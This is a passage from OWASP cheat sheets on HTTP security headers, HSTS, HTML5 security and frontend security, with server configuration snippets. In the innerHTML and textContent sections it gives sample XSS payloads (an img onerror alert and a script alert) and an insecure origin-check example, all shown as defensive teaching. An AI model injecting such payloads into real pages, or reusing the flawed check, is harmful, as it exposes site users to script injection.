The `Expect-CT` header lets sites opt-in to reporting of Certificate Transparency (CT) requirements. Given that mainstream clients now require CT qualification, the only remaining value is reporting such occurrences to the nominated report-uri value in the header. The header is now less about enforcement and more about detection/reporting.

##### Recommendation

Do not use it. Mozilla [recommends](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT) avoiding it, and removing it from existing code if possible.

#### Content-Security-Policy (CSP)

Content Security Policy (CSP) is a security feature that is used to specify the origin of content that is allowed to be loaded on a website or in a web application. It is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement to distribution of malware.

- *NOTE*: This header is relevant to be applied in pages which can load and interpret scripts and code, but might be meaningless in the response of a REST API that returns content that is not going to be rendered.

##### Recommendation

Content Security Policy is complex to configure and maintain. For an explanation on customization options, please read [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

#### Access-Control-Allow-Origin

If you don't use this header, your site is protected by default by the Same Origin Policy (SOP). What this header does is relax this control in specified circumstances.

The `Access-Control-Allow-Origin` is a CORS (cross-origin resource sharing) header. This header indicates whether the response it is related to can be shared with requesting code from the given origin. In other words, if siteA requests a resource from siteB, siteB should indicate in its `Access-Control-Allow-Origin` header that siteA is allowed to fetch that resource, if not, the access is blocked due to Same Origin Policy (SOP).

##### Recommendation

If you use it, set specific [origins](https://developer.mozilla.org/en-US/docs/Glossary/Origin) instead of `*`. Check out [Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) for details.
> `Access-Control-Allow-Origin: https://yoursite.com`

- *NOTE*: The use of '\*' might be necessary depending on your needs. For example, for a public API that should be accessible from any origin, it might be necessary to allow '\*'.

#### Cross-Origin-Opener-Policy (COOP)

The HTTP `Cross-Origin-Opener-Policy` (COOP) response header allows you to ensure a top-level document does not share a browsing context group with cross-origin documents.

This header works together with Cross-Origin-Embedder-Policy (COEP) and Cross-Origin-Resource-Policy (CORP) explained below.

This mechanism protects against attacks like Spectre which can cross the security boundary established by Same Origin Policy (SOP) for resources in the same browsing context group.

As these headers are very related to browsers, it may not make sense to be applied to REST APIs or clients that are not browsers.

##### Recommendation

Isolates the browsing context exclusively to same-origin documents.
> `Cross-Origin-Opener-Policy: same-origin`

#### Cross-Origin-Embedder-Policy (COEP)

The HTTP [`Cross-Origin-Embedder-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Embedder-Policy) (COEP) response header prevents a document from loading any cross-origin resources that don't explicitly grant the document permission (using [CORP](#cross-origin-resource-policy-corp) or CORS).

- *NOTE*: Enabling this will block cross-origin resources not configured correctly from loading.

##### Recommendation

A document can only load resources from the same origin, or resources explicitly marked as loadable from another origin.
> `Cross-Origin-Embedder-Policy: require-corp`

- *NOTE*: The `crossorigin` attribute requests the resource in CORS mode. The resource server must [permit the request through CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy#require-corp); the attribute alone does not grant permission:
- `<img src="https://thirdparty.com/img.png" crossorigin>`

#### Cross-Origin-Resource-Policy (CORP)

The [`Cross-Origin-Resource-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy) (CORP) header allows you to control the set of origins that are empowered to include a resource. It is a robust defense against attacks like [Spectre](https://meltdownattack.com/), as it allows browsers to block a given response before it enters an attacker's process.

##### Recommendation

Limit current resource loading to the site and sub-domains only.
> `Cross-Origin-Resource-Policy: same-site`

#### Permissions-Policy (formerly Feature-Policy)

Permissions-Policy allows you to control which origins can use which browser features, both in the top-level page and in embedded frames. For every feature controlled by Feature Policy, the feature is only enabled in the current document or frame if its origin matches the allowed list of origins. This means that you can configure your site to never allow the camera or microphone to be activated. This prevents that an injection, for example an XSS, enables the camera, the microphone, or other browser feature.

More information: [Permissions-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy)

##### Recommendation

Set it and disable all the features that your site does not need or allow them only to the authorized domains:
> `Permissions-Policy: geolocation=(), camera=(), microphone=()`

- *NOTE*: This example is disabling geolocation, camera, and microphone for all domains.

#### Server

The [`Server`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server) header describes the software used by the origin server that handled the request — that is, the server that generated the response.

This is not a security header, but how it is used is relevant for security.

##### Recommendation

Remove this header or set non-informative values.
> `Server: webserver`

- *NOTE*: Remember that attackers have other means of fingerprinting the server technology.

#### X-Powered-By

The `X-Powered-By` header describes the technologies used by the webserver. This information exposes the server to attackers. Using the information in this header, attackers can find vulnerabilities easier.

##### Recommendation

Remove all `X-Powered-By` headers.

- *NOTE*: Remember that attackers have other means of fingerprinting your tech stack.

#### X-AspNet-Version

Provides information about the .NET version.

##### Recommendation

Disable sending this header. Add the following line in your `web.config` in the `<system.web>` section to remove it.

```xml
<httpRuntime enableVersionHeader="false" />
```

- *NOTE*: Remember that attackers have other means of fingerprinting your tech stack.

#### X-AspNetMvc-Version

Provides information about the .NET version.

##### Recommendation

Disable sending this header. To remove the `X-AspNetMvc-Version` header, add the below line in `Global.asax` file.

```lang-none
MvcHandler.DisableMvcResponseHeader = true;
```

- *NOTE*: Remember that attackers have other means of fingerprinting your tech stack.

#### X-Robots-Tag

The HTTP `X-Robots-Tag` response header controls how search engines and other automated crawlers index and display resources such as PDFs, images, and other non-HTML content.
It functions similarly to the `<meta name="robots">` tag, but is applied via the HTTP response header, allowing greater flexibility (e.g., for non-HTML files or server-wide rules).

```none
X-Robots-Tag: noindex, nofollow
```

- **Note:** Only compliant crawlers respect these directives, and they must still make an HTTP request to read the headers before deciding how to handle the content.

##### Recommendation

Use the `X-Robots-Tag` header to control crawler behavior:

- For **private or sensitive content** you don’t want indexed:

  > `X-Robots-Tag: noindex, nofollow`
  > This prevents compliant search engines from indexing the resource or following links on it.

- For **public content** you want indexed and discoverable (e.g., documentation, datasets):

  > `X-Robots-Tag: index, follow`
  > This allows search engines to index the resource and follow its links.

You can also use other directives such as `noarchive`, `nosnippet`, or `noimageindex` depending on your needs.
Server configuration can apply this header selectively — for example, only on specific file types (like PDFs or images).

#### X-DNS-Prefetch-Control

The `X-DNS-Prefetch-Control` HTTP response header controls DNS prefetching, a feature by which browsers proactively perform domain name resolution on both links that the user may choose to follow as well as URLs for items referenced by the document, including images, CSS, JavaScript, and so forth.

##### Recommendation

The default behavior of browsers is to perform DNS caching which is good for most websites.
If you do not control links on your website, you might want to set `off` as a value to disable DNS prefetch to avoid leaking information to those domains.

> `X-DNS-Prefetch-Control: off`

- *NOTE*: Do not rely on this functionality for anything production sensitive: it is not standard or fully supported and implementation may vary among browsers.

#### Public-Key-Pins (HPKP) ❌

The HTTP `Public-Key-Pins` response header was used to associate a specific cryptographic public key with a web server to mitigate MITM attacks with forged certificates. It was removed from Chromium in 2018 and is unsupported by all modern browsers.

##### Recommendation

Do not use. Remove any `Public-Key-Pins` or `Public-Key-Pins-Report-Only` headers from production. Rely on Certificate Transparency (CT) and CAA DNS records, which provide superior compromise detection without the operational brittleness of pinning.

#### Secure File Download Headers

When serving user-provided files, proper HTTP headers should be used to prevent unintended execution in the browser.

- Use `Content-Disposition: attachment` to force download instead of inline rendering.
- Use `Content-Type: application/octet-stream` for unknown or binary files.
- Ensure `X-Content-Type-Options: nosniff` is set to prevent MIME type sniffing.

These headers help reduce risks such as Cross-Site Scripting (XSS) and unintended file execution.

### Adding HTTP Headers in Different Technologies

#### PHP

The sample code below sets the `X-Frame-Options` header in PHP.

```php
header("X-Frame-Options: DENY");
```

#### Apache

Below is an `.htaccess` sample configuration which sets the `X-Frame-Options` header in Apache.

As described in the [Apache documentation](https://httpd.apache.org/docs/2.4/mod/mod_headers.html#header), `Header set` (default `onsuccess`) and `Header always set` operate on separate internal header tables.

In some cases, both header tables may be used, which can result in duplicate headers if the same header is configured in both contexts.

If a header needs to be removed entirely, it should be unset in both contexts (`onsuccess` and `always`).

To avoid duplication and ensure the header is sent on all responses, unset it first and then use `always set`:

```lang-bsh
<IfModule mod_headers.c>
  Header unset X-Frame-Options
  Header always set X-Frame-Options "DENY"
</IfModule>
```

#### IIS

Add configurations below to your `Web.config` in IIS to send the `X-Frame-Options` header.

```xml
<system.webServer>
...
 <httpProtocol>
   <customHeaders>
     <add name="X-Frame-Options" value="DENY" />
   </customHeaders>
 </httpProtocol>
...
</system.webServer>
```

#### HAProxy

Add the line below to your front-end, listen, or backend configurations to send the `X-Frame-Options` header.

```lang-none
http-response set-header X-Frame-Options DENY
```

#### Nginx

Below is a sample configuration, it sets the `X-Frame-Options` header in Nginx. Note that without the `always` option, the header will only be sent for certain status codes, as described in [the nginx documentation](https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header).

```lang-none
add_header "X-Frame-Options" "DENY" always;
```

#### Express

You can use [helmet](https://www.npmjs.com/package/helmet) to setup HTTP headers in Express. The code below is a sample for adding the `X-Frame-Options` header.

```javascript
const helmet = require('helmet');
const app = express();
// Sets "X-Frame-Options: SAMEORIGIN"
app.use(
 helmet.frameguard({
   action: "sameorigin",
 })
);
```

### Testing Proper Implementation of Security Headers

#### Mozilla Observatory

The [Mozilla Observatory](https://observatory.mozilla.org/) is an online tool which helps you to check your website's header status.

#### SmartScanner

[SmartScanner](https://www.thesmartscanner.com/) has a dedicated [test profile](https://www.thesmartscanner.com/docs/configuring-security-tests) for testing security of HTTP headers.
Online tools usually test the homepage of the given address. But SmartScanner scans the whole website. So, you can make sure all of your web pages have the right HTTP Headers in place.

## HTTP Strict Transport Security

> **Source:** [HTTP Strict Transport Security](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

HTTP [Strict Transport Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) (also named **HSTS**) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.

The specification has been released and published end of 2012 as [RFC 6797](http://tools.ietf.org/html/rfc6797) (HTTP Strict Transport Security (HSTS)) by the IETF.

### Threats

HSTS addresses the following threats:

- User bookmarks or manually types `http://example.com` and is subject to a man-in-the-middle attacker
    - HSTS automatically redirects HTTP requests to HTTPS for the target domain
- Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP
    - HSTS automatically redirects HTTP requests to HTTPS for the target domain
- A man-in-the-middle attacker attempts to intercept traffic from a victim user using an invalid certificate and hopes the user will accept the bad certificate
    - HSTS does not allow a user to override the invalid certificate message

### Examples

This example sets a long (2 years = 63072000 seconds) max-age for the issuing host. Without `includeSubDomains`, [this policy does not extend to its subdomains](https://www.rfc-editor.org/rfc/rfc6797.html#section-6.1.2); see the [subdomain cookie risks](#problems) below:

`Strict-Transport-Security: max-age=63072000`

This example is useful if all present and future subdomains will be HTTPS. This is a more secure option but will block access to certain pages that can only be served over HTTP:

`Strict-Transport-Security: max-age=63072000; includeSubDomains`

This example is useful if all present and future subdomains will be HTTPS. In this example we set a very short max-age in case of mistakes during initial rollout:

`Strict-Transport-Security: max-age=86400; includeSubDomains`

**Recommended:**

- If the site owner would like their domain to be included in the [HSTS preload list](https://hstspreload.org) maintained by Chrome (and used by Firefox and Safari), then use the header below.
- Sending the `preload` directive from your site can have **PERMANENT CONSEQUENCES** and prevent users from accessing your site and any of its subdomains if you find you need to switch back to HTTP. Please read the details at [preload removal](https://hstspreload.org/#removal) before sending the header with `preload`.

`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`

The `preload` flag indicates the site owner's consent to have their domain preloaded. The site owner still needs to then go and submit the domain to the list.

### Problems

Site owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak. Take a look [here](http://www.leviathansecurity.com/blog/the-double-edged-sword-of-hsts-persistence-and-privacy) for more details.

Cookies can be manipulated from sub-domains, so omitting the `includeSubDomains` option permits a broad range of cookie-related attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the `secure` flag is set on all cookies will also prevent, some, but not all, of the same attacks.

### Browser Support

As of September 2019 HSTS is supported by [all modern browsers](https://caniuse.com/#feat=stricttransportsecurity), with the only notable exception being Opera Mini.

For TLS configuration, see the [Transport Layer Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html).

## HTML5 Security

> **Source:** [HTML5 Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

The following cheat sheet serves as a guide for implementing HTML 5 in a secure fashion.

### Communication APIs

#### Web Messaging

Web Messaging (also known as Cross Domain Messaging) provides a means of messaging between documents from different origins in a way that is generally safer than the multiple hacks used in the past to accomplish this task. However, there are still some recommendations to keep in mind:

- When posting a message, explicitly state the expected origin as the second argument to `postMessage` rather than `*` in order to prevent sending the message to an unknown origin after a redirect or some other means of the target window's origin changing.
- The receiving page should **always**:
    - Check the `origin` attribute of the sender to verify the data is originating from the expected location.
    - Perform input validation on the `data` attribute of the event to ensure that it's in the desired format.
- Don't assume you have control over the `data` attribute. A single [Cross Site Scripting](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) flaw in the sending page allows an attacker to send messages of any given format.
- Both pages should only interpret the exchanged messages as **data**. Never evaluate passed messages as code (e.g. via `eval()`) or insert it to a page DOM (e.g. via `innerHTML`), as that would create a DOM-based XSS vulnerability. For more information see [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
- To assign the data value to an element, instead of using a insecure method like `element.innerHTML=data;`, use the safer option: `element.textContent=data;`
- Check the origin properly exactly to match the FQDN(s) you expect. Note that the following code: `if(message.origin.indexOf(".owasp.org")!=-1) { /* ... */ }` is very insecure and will not have the desired behavior as `owasp.org.attacker.com` will match.
- If you need to embed external content/untrusted gadgets and allow user-controlled scripts (which is highly discouraged), please check the information on [sandboxed frames](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#sandboxed-frames).

#### Cross Origin Resource Sharing

- Validate URLs passed to `XMLHttpRequest.open`. Current browsers allow these URLs to be cross domain; this behavior can lead to code injection by a remote attacker. Pay extra attention to absolute URLs.
- Ensure that URLs responding with `Access-Control-Allow-Origin: *` do not include any sensitive content or information that might aid attacker in further attacks. Use the `Access-Control-Allow-Origin` header only on chosen URLs that need to be accessed cross-domain. Don't use the header for the whole domain.
- Allow only selected, trusted domains in the `Access-Control-Allow-Origin` header. Prefer allowing specific domains over blocking or allowing any domain (do not use `*` wildcard nor blindly return the `Origin` header content without any checks).
- Keep in mind that CORS does not prevent the requested data from going to an unauthorized location. It's still important for the server to perform usual [CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) prevention.
- While the [Fetch Standard](https://fetch.spec.whatwg.org/#http-cors-protocol) recommends a pre-flight request with the `OPTIONS` verb, current implementations might not perform this request, so it's important that "ordinary" (`GET` and `POST`) requests perform any access control necessary.
- Discard requests received over plain HTTP with HTTPS origins to prevent mixed content bugs.
- Don't rely only on the Origin header for Access Control checks. Browser always sends this header in CORS requests, but may be spoofed outside the browser. Application-level protocols should be used to protect sensitive data.

#### WebSockets

- Check out [WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html) to learn about WebSocket specific protections.

#### Server-Sent Events

- Validate URLs passed to the `EventSource` constructor. [Cross-origin connections use CORS](https://html.spec.whatwg.org/multipage/server-sent-events.html#dom-eventsource) and require permission from the event-stream server.
- As mentioned before, process the messages (`event.data`) as data and never evaluate the content as HTML or script code.
- Always check the origin attribute of the message (`event.origin`) to ensure the message is coming from a trusted domain. Use an allow-list approach.

### Storage APIs

#### Local Storage

- Also known as Offline Storage, Web Storage. Underlying storage mechanism may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended to avoid storing any sensitive information in local storage where authentication would be assumed.
- Due to the browser's security guarantees it is appropriate to use local storage where access to the data is not assuming authentication or authorization.
- Use the object sessionStorage instead of localStorage if persistent storage is not needed. sessionStorage object is available only to that window/tab until the window is closed.
- A single [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) can be used to steal all the data in these objects, so again it's recommended not to store sensitive information in local storage.
- A single [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) can be used to load malicious data into these objects too, so don't consider objects in these to be trusted.
- Pay extra attention to "localStorage.getItem" and "setItem" calls implemented in HTML5 page. It helps in detecting when developers build solutions that put sensitive information in local storage, which can be a severe risk if authentication or authorization to that data is incorrectly assumed.
- Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the `httpOnly` flag.
- There is no way to restrict the visibility of an object to a specific path like with the attribute path of HTTP Cookies, every object is shared within an origin and protected with the Same Origin Policy. Avoid hosting multiple applications on the same origin, all of them would share the same localStorage object, use different subdomains instead.

#### Client-side databases

- Web SQL Database was deprecated by the W3C in 2010 and is **removed from all major browsers**: Chromium dropped support in version 119 (October 2023) and Safari/Firefox never shipped it for third-party origins. Do not use Web SQL. If you specifically need an SQL interface in the browser, prefer running an embedded engine such as the official [SQLite WebAssembly build (`sqlite-wasm`)](https://sqlite.org/wasm/doc/trunk/about.md), backed by IndexedDB or the Origin Private File System (OPFS) for persistence.
- The current standard for client-side structured storage is **[IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)**, a transactional key-value store that has been a W3C Recommendation since 2015 and is supported in all evergreen browsers.
- Underlying storage mechanisms vary across user agents and operating systems. A user or process with access to the browser profile can read or modify stored data; do not assume IndexedDB provides confidentiality. Avoid storing session tokens, credentials, or other secrets there. If sensitive data must be stored locally, design encryption and key management for the device-access threat. A non-extractable `CryptoKey` restricts Web Crypto export operations, but [does not guarantee protection of persisted keys from device access or prevent hostile scripts from using the key](https://www.w3.org/TR/webcrypto/#security-developers).
- A single [Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/) vulnerability can read or write any data in IndexedDB; treat its contents as untrusted input on read.
- Apply the same input validation and output encoding rules to data coming from IndexedDB as you would to data coming from the network.

### Geolocation

- The [Geolocation API](https://www.w3.org/TR/2021/WD-geolocation-20211124/#security) requires that user agents ask for the user's permission before calculating location. Whether or how this decision is remembered varies from browser to browser. Some user agents require the user to visit the page again in order to turn off the ability to get the user's location without asking, so for privacy reasons, it's recommended to require user input before calling `getCurrentPosition` or `watchPosition`.

### Web Workers

- Web Workers are allowed to use `XMLHttpRequest` object to perform in-domain and Cross Origin Resource Sharing requests. See relevant section of this Cheat Sheet to ensure CORS security.
- While Web Workers don't have access to DOM of the calling page, malicious Web Workers can use excessive CPU for computation, leading to Denial of Service condition or abuse Cross Origin Resource Sharing for further exploitation. Ensure code in all Web Workers scripts is not malevolent. Don't allow creating Web Worker scripts from user supplied input.
- Validate messages exchanged with a Web Worker. Do not try to exchange snippets of JavaScript for evaluation e.g. via `eval()` as that could introduce a [DOM Based XSS](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) vulnerability.

### Tabnabbing

Attack is described in detail in this [article](https://owasp.org/www-community/attacks/Reverse_Tabnabbing).

To summarize, it's the capacity to act on parent page's content or location from a newly opened page via the back link exposed by the **opener** JavaScript object instance.

It applies to an HTML link or a JavaScript `window.open` function using the attribute/instruction `target` to specify a [target loading location](https://www.w3schools.com/tags/att_a_target.asp) that does not replace the current location and then makes the current window/tab available.

To prevent this issue, the following actions are available:

Cut the back link between the parent and the child pages:

- For HTML links:
    - To cut this back link, add the attribute `rel="noopener"` on the tag used to create the link from the parent page to the child page. This attribute value cuts the link, but depending on the browser, lets referrer information be present in the request to the child page.
    - To also remove the referrer information use this attribute value: `rel="noopener noreferrer"`.
- For the JavaScript `window.open` function, add the values `noopener,noreferrer` in the [windowFeatures](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) parameter of the `window.open` function.

As the behavior using the elements above is different between the browsers, either use an HTML link or JavaScript to open a window (or tab), then use this configuration to maximize the cross supports:

- For [HTML links](https://www.scaler.com/topics/html/html-links/), add the attribute `rel="noopener noreferrer"` to every link.
- For JavaScript, use this function to open a window (or tab):

```javascript
function openPopup(url, name, windowFeatures = "") {
  const features = ["noopener", "noreferrer", windowFeatures]
    .filter(Boolean)
    .join(",");
  window.open(url, name, features);
}
```

- Add the HTTP response header `Referrer-Policy: no-referrer` to every HTTP response sent by the application ([Header Referrer-Policy information](https://owasp.org/www-project-secure-headers/). This configuration will ensure that no referrer information is sent along with requests from the page.

Compatibility matrix:

- [noopener](https://caniuse.com/#search=noopener)
- [noreferrer](https://caniuse.com/#search=noreferrer)
- [referrer-policy](https://caniuse.com/#feat=referrer-policy)

### Sandboxed frames

- Use the `sandbox` attribute of an `iframe` for untrusted content.
- The `sandbox` attribute of an `iframe` enables restrictions on content within an `iframe`. The following restrictions are active when the `sandbox` attribute is set:
    1. All markup is treated as being from a unique origin.
    2. All forms and scripts are disabled.
    3. All links are prevented from targeting other browsing contexts.
    4. All features that trigger automatically are blocked.
    5. All plugins are disabled.

It is possible to have a [fine-grained control](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) over `iframe` capabilities using the value of the `sandbox` attribute.

- In old versions of user agents where this feature is not supported, this attribute will be ignored. Use this feature as an additional layer of protection or check if the browser supports sandboxed frames and only show the untrusted content if supported.
- Apart from this attribute, to prevent Clickjacking attacks and unsolicited framing it is encouraged to use the header `X-Frame-Options` which supports the `deny` and `same-origin` values. Other solutions like framebusting `if(window!==window.top) { window.top.location=location;}` are not recommended.

### Credential and Personally Identifiable Information (PII) Input hints

Form attributes provide input and autofill hints; they are not a guarantee that the browser will avoid storing sensitive values.

For sensitive fields where autofill is inappropriate, `autocomplete="off"` requests that the browser not remember or prefill the value. However, [browsers may still offer to save and autofill login credentials](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/autocomplete#description). Do not treat this attribute as protection against credential reuse on a shared computer.

```html
<input type="text" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off">
```

These attributes can adjust input assistance, but do not enforce a no-storage policy:

- `spellcheck="false"`
- `autocomplete="off"`
- `autocorrect="off"`
- `autocapitalize="off"`

### Offline Applications

- The HTML5 Application Cache (`<html manifest="...">` and `.appcache` files) has been **removed from all major browsers** (Firefox 85, Chrome 93). Do not use it for new applications and migrate any remaining usage to **Service Workers** with the [Cache API](https://developer.mozilla.org/en-US/docs/Web/API/Cache).
- Service Workers run on a separate, scriptable thread and intercept network requests for the registered scope. Because they can transparently serve cached responses, they have a significant security impact:
    - Only register Service Workers from your own origin and **only serve the worker script over HTTPS** with a long-cache-busting filename (e.g. `sw.<hash>.js`).
    - Validate that the scope of the Service Worker is restricted (use the `scope` option or the `Service-Worker-Allowed` response header) so a compromised worker cannot intercept unrelated paths.
    - A malicious or compromised Service Worker can intercept requests from the pages it controls. Have a documented recovery process that [updates or unregisters the worker](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) and removes affected caches. Expiring cached data does not unregister a worker.
    - Do not put responses containing sensitive data into the Cache API. [`Cache` does not honor HTTP caching headers, and entries do not expire automatically](https://developer.mozilla.org/en-US/docs/Web/API/Cache); service-worker code must explicitly exclude these responses and delete any sensitive entries already stored. Continue sending `Cache-Control: no-store` to control HTTP caches.

### Progressive Enhancements and Graceful Degradation Risks

- The best practice now is to determine the capabilities that a browser supports and augment with substitutes only for capabilities that are not directly supported. Do not fall back to obsolete browser plugins — Adobe Flash Player reached end-of-life on 31 December 2020 and is removed from all browsers; Java applets, Silverlight, and ActiveX are likewise unsupported. Native HTML5 (`<video>`, `<audio>`, `<canvas>`, WebAssembly) covers these legacy use cases.

### HTTP Headers to enhance security

Consult the project [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/) in order to obtains the list of HTTP security headers that an application should use to enable defenses at browser level.

## Web Frontend Security

> **Source:** [Web Frontend Security](https://cheatsheetseries.owasp.org/cheatsheets/Web_Frontend_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This cheat sheet was previously named the AJAX Security Cheat Sheet.

This document will provide a starting point for AJAX security and will hopefully be updated and expanded reasonably often to provide more detailed information about specific frameworks and technologies.

For applications that compose independently deployed frontend features, see the [Micro-Frontend Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Micro_Frontend_Security_Cheat_Sheet.html) for runtime isolation, cross-application messaging, and host-to-remote trust boundaries.

**Before applying any specific control, developers must adopt a fundamental security mindset:**
All data should be considered untrusted unless explicitly validated and safely handled.
This applies to:

- Client-side input
- API response
- Third-party integrations
- Internal services and microservices
- Cached responses
- Browser storage (localStorage, sessionStorage)
- Hidden form fields

#### Client-Side (JavaScript)

##### Use `innerHTML` with extreme caution

Manipulating the Document Object Model (DOM) is common in web applications, especially in monolithic server-side rendering (e.g., PHP, ASP.NET) and AJAX-driven applications. While `innerHTML` seems like a convenient way to inject HTML content, it poses significant security risks on untrusted-data, particularly cross-site scripting (XSS).

###### What is `innerHTML`?

The `innerHTML` property sets or gets the HTML content of an element, including tags, which the browser parses and renders as part of the DOM. For example, setting `innerHTML = "<p>Hello</p>"` creates a paragraph element.

###### Why does `innerHTML` require extreme caution?

Using `innerHTML` with untrusted data (e.g., from API responses in AJAX) can allow malicious JavaScript to execute in the user’s browser, leading to XSS vulnerabilities. Potential risks include:

- Stealing user session cookies.
- Defacing the website.
- Redirecting users to malicious sites.
- Performing unauthorized actions (e.g., API calls on behalf of the user).
- Keylogging user inputs.

###### Vulnerable Example

```javascript
    document.getElementById('content').innerHTML = data;
    // DANGER! The server may have returned a payload that executes scripts, for example: <img src=abc onerror=alert('xss!')>.
```

###### When is `innerHTML` acceptable?

The fundamental security rule is to never use innerHTML with untrusted data. However, in limited cases, such as legacy monolithic applications with no viable alternatives, innerHTML may be used cautiously:

- **Static, Hardcoded HTML**: For small, fixed HTML snippets that are part of your application’s source code and contain no user input:

```javascript
document.getElementById('footer').innerHTML = '<p>© 2025 My Company. All rights reserved.</p>';
```

- **Sanitized HTML**: For user-generated HTML (e.g., in rich text editors), sanitize with a library like [DOMPurify](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html#1-html-sanitization) before using innerHTML:

```javascript
import DOMPurify from 'dompurify';
const userInput = '<img src=abc onerror=alert("xss")>';
document.getElementById('content').innerHTML = DOMPurify.sanitize(userInput); // Safe, removes malicious code
```

###### Alternatives

- Use Templating Engines (with auto-escaping) for reusable, structured HTML snippets.
- Use framework text bindings, which generally escape text rather than sanitize arbitrary markup; [Vue documents this distinction](https://vuejs.org/guide/best-practices/security). Raw-HTML APIs such as [React's `dangerouslySetInnerHTML`](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html) require trusted, sanitized HTML. URL and style bindings need controls appropriate to their context; see [Framework Security](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security).

##### Use of `textContent` or `innerText` for DOM updates (for text-only content)

In AJAX and monolithic server-side rendering applications (e.g., PHP, ASP.NET), dynamic Document Object Model (DOM) updates are common for rendering text-only content from APIs or user inputs.

###### What is `textContent`?

The `textContent` property sets or gets the plain text content of an element. It treats inserted HTML tags as literal text and does not parse them. It is ideal for most text-only updates, such as displaying user comments, etc.

```javascript
const userInput = '<script>alert("OWASP")</script>';
document.getElementById('content').textContent = userInput; // Displays plain text
```

###### What is `innerText`?

The `innerText` property sets or gets the visible text content of an element, respecting CSS styling (e.g., ignoring text in `display: none` elements). It also reflects rendered text formatting, such as line breaks or spacing.

```javascript
const userInput = 'OWASP';
document.getElementById('content').innerText = userInput;
```

###### When to Use `textContent` vs. `innerText`

- **Use `textContent`**: Use textContent in monolithic applications to safely insert plain text content returned from APIs.
- **Use `innerText`**: Only when CSS visibility or rendered text formatting (e.g. ignoring text in `display: none` elements) is required.

> Note: `textContent` is slightly faster and more predictable; use it unless you need to respect rendered text formatting (`innerText`).

###### Note

- While `textContent` and `innerText` are safe for inserting plain text into the DOM, they do not protect against XSS in other contexts such as HTML attributes, JavaScript event handlers, or URLs. Always validate and sanitize untrusted input.
- Modern Frameworks like React, Vue, Angular, or Svelte automatically update text-only content so there is no need to manually use `textContent` or `innerText`.

##### Don't use `eval()`, `new Function()` or other code evaluation tools

`eval()` function is dangerous, never use it. Needing to use eval() usually indicates a problem in your design.

> Note: Using `eval()` or `new Function()` opens doors to remote code execution and XSS. Avoid it entirely.

##### Encode Data Before Use in an Output Context

When using data to build HTML, script, CSS, XML, JSON, etc., make sure you take into account how that data must be presented in a literal sense to keep its logical meaning.

Data should be properly encoded before being used in this manner to prevent injection style issues, and to make sure the logical meaning is preserved.

[Check out the OWASP Java Encoder Project.](https://owasp.org/www-project-java-encoder/)

##### Don't rely on client logic for security

Don't forget that the user controls the client-side logic. A number of browser plugins are available to set breakpoints, skip code, change values, etc. Never rely on client logic for security.

##### Don't rely on client business logic

As with security logic, make sure any important business rules are duplicated on the server side so a user cannot bypass them, which could lead to unexpected or costly behavior.

##### Avoid writing serialization code

